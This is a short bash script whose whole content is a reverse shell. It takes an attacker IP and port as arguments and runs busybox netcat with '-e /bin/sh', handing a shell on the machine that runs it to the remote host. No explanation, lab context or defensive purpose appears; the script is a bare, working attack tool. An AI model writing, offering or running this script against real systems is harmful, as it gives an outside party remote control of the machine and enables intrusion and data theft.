#!/bin/bash
ATTACKER_IP=$1
PORT=$2

busybox nc $ATTACKER_IP $PORT -e /bin/sh
